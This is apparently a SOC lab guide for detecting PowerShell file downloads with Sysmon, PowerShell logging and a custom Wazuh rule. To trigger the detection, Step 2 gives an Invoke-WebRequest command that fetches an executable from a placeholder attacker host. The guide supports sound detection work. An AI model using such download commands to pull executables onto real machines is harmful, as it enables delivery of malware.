üìå Objective
Simulate and detect a suspicious file download performed via PowerShell using Invoke-WebRequest, and trigger alerts in Wazuh using built-in and custom rules.

‚öôÔ∏è Step 1: Set Up a Local Web Server (Linux or Windows)
From the directory containing test.exe:
python3 -m http.server 8000
This hosts the file at:
http://<attacker_ip>:8000/test.exe

‚öôÔ∏è Step 2: Simulate Malicious PowerShell Download on Windows
On the test machine:
Invoke-WebRequest -Uri "http://<attacker_ip>:8000/test.exe" -OutFile "$env:USERPROFILE\Downloads\test.exe"

‚úÖ This triggers:
 ** Sysmon Event ID 1 (Process Create)
 ** Sysmon Event ID 3 (Network Connection)
 ** File creation detection
 ** PowerShell ScriptBlock logging

‚öôÔ∏è Step 3: Enable Logging for Detection
Ensure the following are enabled:

‚úÖ Sysmon Config:
Detect process creation and network activity:
<EventFiltering>
  <ProcessCreate onmatch="include" />
  <NetworkConnect onmatch="include" />
</EventFiltering>

‚úÖ PowerShell Logging via GPO or registry:
ScriptBlockLogging: HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging ‚Üí EnableScriptBlockLogging=1
ModuleLogging: EnableModuleLogging=1

‚öôÔ∏è Step 4: Wazuh Rules for Detection
‚úÖ Built-in Rules That Will Fire
 ** 92203: Executable file created by PowerShell

üß© Custom Rules Overview
The following rules were added inside a custom Wazuh rules group called:
<group name="custom_powershell_downloads">
<rule id="100200" level="12">
  <if_sid>92203</if_sid>
  <description>Custom: PowerShell created executable file (likely suspicious download)</description>
  <mitre>
    <id>T1059</id> <!-- Command and Scripting Interpreter -->
    <id>T1105</id> <!-- Ingress Tool Transfer -->
  </mitre>
  <group>malware, download, suspicious, powershell</group>
</rule>
</group>

Explanation:
 ** This rule triggers when Wazuh built-in rule 92203 fires, which detects when PowerShell creates an executable file, such as .exe.
 ** This behavior may indicate a file was downloaded using Invoke-WebRequest, Start-BitsTransfer, or similar commands.
 ** The rule is tagged with MITRE ATT&CK techniques:
 ** T1059: Command and Scripting Interpreter ‚Äî abuse of PowerShell
 ** T1105: Ingress Tool Transfer ‚Äî file download from external sources

‚úÖ Result
When PowerShell is used to download and create executables, your Wazuh manager will generate high-confidence alerts, helping your SOC team respond faster to potential threats.
